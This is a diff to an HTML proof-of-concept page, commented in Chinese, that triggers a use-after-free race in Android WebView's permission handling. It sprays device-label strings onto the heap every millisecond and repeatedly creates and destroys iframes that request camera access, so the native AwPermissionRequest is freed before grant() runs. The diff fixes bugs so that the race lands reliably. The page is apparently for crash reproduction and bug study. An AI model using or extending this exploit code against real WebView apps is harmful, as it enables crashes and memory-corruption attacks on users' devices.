@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebView UAF 稳定性压测 (自动化闭环版)</title>
+    <title>WebView UAF 稳定性压测 (终极修复版)</title>
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; text-align: center; padding: 40px 20px; background: #fafafa; color: #333; }
         .card { max-width: 550px; margin: 0 auto; background: white; padding: 30px; border-radius: 16px; box-shadow: 0 4px 24px rgba(0,0,0,0.06); border: 1px solid #e5e5e7; }
@@ -24,7 +24,7 @@
 
     <div class="card">
         <h2>🛸 WebView 内存漏洞对撞机</h2>
-        <p style="color: #86868b; font-size: 14px;">用于复现 c++ 层 synth_three_way 释放后死指针闪退</p>
+        <p style="color: #86868b; font-size: 14px;">修复 Iframe 策略与 Typo 乌龙后的完美对撞版本</p>
         
         <div class="status-box" id="statusLog">等待开始：请严格按照下方步骤操作</div>
 
@@ -34,12 +34,10 @@
         
         <div class="steps">
             <strong>🎯 完美复现操作指南：</strong><br>
-            1. 请确保你的客户端代码中，Java 层的 <code style="background:#e0e0e0; padding:2px 4px; border-radius:4px;">grant()</code> 函数内已加入 <code class="warning">Thread.sleep(5);</code> 下毒代码。<br>
-            2. 点击上面的 <span class="success">蓝色按钮 1</span>，在系统弹窗中选择<strong>“允许”</strong>。<br>
-            <blockquote>这一步极为关键！只有允许过一次，后续的设备枚举才能拿到含有 "camera2" 的真实字符串，否则内核出于隐私保护只会返回空字符串，无法污染堆内存。</blockquote>
-            3. 观察上方状态栏，当显示“相机标签已解锁”后，<span class="warning">红色按钮 2</span> 会激活。<br>
-            4. 点击 <span class="warning">红色按钮 2</span>，网页将开始疯狂高频拆卸 Iframe 并轰炸多媒体堆内存。<br>
-            5. 此时去点击 App 弹出的任何权限确认，或者静置几秒，App 将轰然闪退。
+            1. 请确保客户端 Java 层的 <code style="background:#e0e0e0; padding:2px 4px; border-radius:4px;">grant()</code> 函数内已加入 <code class="warning">Thread.sleep(5);</code> 下毒代码。<br>
+            2. 点击上面的 <span class="success">蓝色按钮 1</span>，在系统弹窗中选择<strong>“允许”</strong>。等待上方状态变绿。<br>
+            3. 点击 <span class="warning">红色按钮 2</span>，网页将开始高频向 App 输送权限请求流并疯狂强拆。<br>
+            4. 此时去点击 App 弹出的任意一个权限确认按钮（或者让 App 内部逻辑自动触发 <code style="background:#e0e0e0; padding:2px 4px; border-radius:4px;">grant()</code>），App 将精准闪退在 C++ 层的 <code class="warning">SetOriginCanReadEnumerateDevicesVideoLabels</code> 处。
         </div>
     </div>
 
@@ -52,22 +50,20 @@
             log.style.color = isError ? '#ff3b30' : '#007aff';
         }
 
-        // 【破除限制 1】异步解锁浏览器的隐私保护机制
+        // 解锁浏览器的隐私保护机制（让设备枚举可以拿到真正的 camera2 字符串）
         function unlockCameraLabels() {
             updateStatus("正在请求初次授权...");
-            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+            navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
-                    // 成功获取权限，立刻停止流以释放硬件
-                    stream.getTracks().forEach(track => track.stop());
+                    stream.getTracks().forEach(track => track.stop()); // 拿完立刻释放
                     
-                    // 验证是否真的拿到了有毒的 camera2 字符串
                     navigator.mediaDevices.enumerateDevices().then(devices => {
                         const hasLabels = devices.some(d => d.label && d.label.length > 0);
                         if (hasLabels) {
                             isLabelsUnlocked = true;
                             document.getElementById('btnAttack').disabled = false;
                             document.getElementById('btnAuth').disabled = true;
-                            updateStatus("✅ 相机真实标签已成功解锁！堆污染源已就绪。可以开始第二步。");
+                            updateStatus("✅ 相机真实标签已解锁！污染源就绪。请开启第二步。");
                         } else {
                             updateStatus("❌ 警告：未能获取到真实设备标签，请确认已允许权限。", true);
                         }
@@ -78,43 +74,41 @@
                 });
         }
 
-        // 【破除限制 2 + 制造 Free + 内存填坑】
+        // 核心对撞流
         function triggerRaceConditionAttack() {
             if (!isLabelsUnlocked) return;
-            updateStatus("🔥 对撞机已全功率点火！正在疯狂制造时序断层...");
+            updateStatus("🔥 对撞机全功率运转中...请在客户端点击“允许”触发对撞！");
 
-            // 核心对撞动作 1：高频高压轰炸多媒体硬件层
-            // 只要第一步解锁了，这里每次调用都会在 C++ 堆内存中疯狂生成 "camera2 1, facing front" 的字符串数据来洗刷堆空间
+            // 动作 1：密集清洗堆空间
             setInterval(() => {
                 navigator.mediaDevices.enumerateDevices()
                     .then(devices => {
-                        // 强行把标签拼接，确保字符串常驻并刷新年轻代堆内存桶(Size-class 0x50)
                         let dummy = devices.map(d => d.label).join(","); 
                     }).catch(()=>{});
             }, 1);
 
-            // 核心对撞动作 2：通过动态跨域 Iframe 强拆，单方面逼迫 C++ 销毁 Request 对象
-            // 解决原生 getUserMedia 弹窗被节流（Throttling）无法高频创建的问题
+            // 动作 2：完美的“创建-IPC申请-强拆销毁”闭环
             setInterval(() => {
-                // 动态创建小房子
                 let iframe = document.createElement('iframe');
                 iframe.style.display = 'none';
+                
+                // ⭐【关键修复 1】必须显式赋予 iframe 权限策略，否则浏览器前端直接拦截，请求根本送不到 Java 
+                iframe.allow = "camera; microphone"; 
                 iframe.src = "about:blank"; 
                 document.body.appendChild(iframe);
 
-                // 在小房子内部发起权限请求（这会通过 IPC 丢给 Java 层的 WebChromeClient 触发回调）
-                if (iframe.contentWindow && iframe.contentWindow.navigator.mediaDevices) {
-                    iframe.contentWindow.navigator.navigator.mediaDevices.getUserMedia({ video: true })
-                        .catch(() => {});
+                // ⭐【关键修复 2】修复之前手抖写错的 navigator.navigator 弱智乌龙
+                if (iframe.contentWindow && iframe.contentWindow.navigator && iframe.contentWindow.navigator.mediaDevices) {
+                    iframe.contentWindow.navigator.mediaDevices.getUserMedia({ video: true })
+                        .catch(() => {}); // 捕获由于强拆导致的 AbortError，让循环不中断
                 }
 
-                // 【绝杀时序】：4毫秒后，不管 Java 响应到哪一步，强行把 iframe 挫骨扬灰！
-                // 这会触发 Chromium 内核单方面熔断，无条件 delete 掉 C++ 层的 AwPermissionRequest
+                // 4毫秒后强拆，给 IPC 通信留出到达 Java 的时间，但赶在 Java 执行 grant 之前在 C++ 端单方面销毁
                 setTimeout(() => {
                     iframe.remove();
                 }, 4);
 
-            }, 15); // 每 15 毫秒完成一轮“出生 -> 申请 -> 强拆”的轮回
+            }, 20); 
         }
     </script>
 </body>
